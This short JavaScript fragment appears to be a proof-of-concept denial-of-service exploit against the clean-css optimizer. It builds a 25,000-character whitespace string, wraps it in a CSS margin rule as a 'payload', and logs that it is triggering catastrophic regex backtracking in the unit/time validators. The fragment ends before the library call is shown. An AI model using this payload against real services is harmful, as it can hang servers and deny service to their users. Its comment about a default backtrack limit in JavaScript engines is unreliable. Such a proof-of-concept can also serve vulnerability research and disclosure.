   // Without explicit bounds limits, a long string of whitespace characters that fails validation forces
   // the regex engine to exponentially backtrack through every possible combination of space
   // positions before terminating. This results in O(2^n) time complexity.

   // The length is chosen to aggressively exceed the JS engine's default backtrack limit (~10k-30k steps).
   const maliciousWhitespace = ' '.repeat(25000);

   // Wrapping the whitespace in a standard CSS rule forces flow through the optimizer/validator pipeline.
   // The input bypasses simple keywords and reaches the vulnerable unit/time validators.
   const payload = `body { margin: ${maliciousWhitespace}; }`;

   console.log('[*] Triggering ReDoS in clean-css optimizer...');
   console.log('[+] Payload whitespace length:', maliciousWhitespace.length);

